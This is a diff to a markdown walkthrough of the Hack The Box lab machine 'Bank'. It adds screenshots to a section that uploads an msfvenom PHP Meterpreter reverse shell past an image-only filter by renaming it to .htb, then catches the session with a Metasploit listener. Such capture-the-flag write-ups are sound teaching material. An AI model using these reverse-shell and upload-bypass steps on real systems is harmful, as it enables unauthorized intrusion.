@@ -695,7 +695,12 @@ hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6
 No encoder specified, outputting raw payload
 Payload size: 30687 bytes
 ```
-And we go back to our Support page, attaching our `shell.php` PHP reverse shell and submitting it. Unfortunately it returned with the error "You cant upload this file. You can upload only images.". If we read the Developer's comments carefully, we realise that the file extension `.htb` is supported instead for debugging purposes.
+And we go back to our Support page, attaching our `shell.php` PHP reverse shell and submitting it. Unfortunately it returned with the error "You cant upload this file. You can upload only images.". 
+
+![php1](https://user-images.githubusercontent.com/21957042/113511671-9061ed00-9593-11eb-9404-0086d4ded1e0.png)
+![php2](https://user-images.githubusercontent.com/21957042/113511672-9061ed00-9593-11eb-856f-6b0f8741679a.png)
+
+If we read the Developer's comments carefully, we realise that the file extension `.htb` is supported instead for debugging purposes.
 
 Let's use msfvenom again to craft a PHP reverse shell, but using a HTB wrapper.
 ```
@@ -707,7 +712,10 @@ Payload size: 30687 bytes
 ```
 This time, we try uploading our `shell.htb` PHP reverse shell and it worked, with the message "Your ticket has been created successfully".
 
-We now start a Meterpreter listener, and try to execute this payload which will most likely be on `http://bank.htb/uploads/` as we've seen from our Gobuster earlier.
+![htb1](https://user-images.githubusercontent.com/21957042/113511667-8dff9300-9593-11eb-9609-f3e0101ef26e.png)
+![htb2](https://user-images.githubusercontent.com/21957042/113511669-8f30c000-9593-11eb-9b81-444a3bd0c7a9.png)
+
+We now start a Meterpreter listener, and try to execute this payload.
 ```
 msf5 > use multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -719,7 +727,10 @@ msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.19:6969 
 ```
-All that is left is to execute our shell, by navigating to `http://bank.htb/uploads/shell.htb`.
+All that is left is to execute our shell, by navigating to `http://bank.htb/uploads/shell.htb`, or clicking on the Attachment (Click Here).
+
+![open](https://user-images.githubusercontent.com/21957042/113511670-8fc95680-9593-11eb-9301-483543bc4d23.png)
+
 ```
 [*] Started reverse TCP handler on 10.10.14.19:6969 
 [*] Meterpreter session 1 opened (10.10.14.19:6969 -> 10.129.29.200:57404) at 2021-01-31 21:19:13 +0800
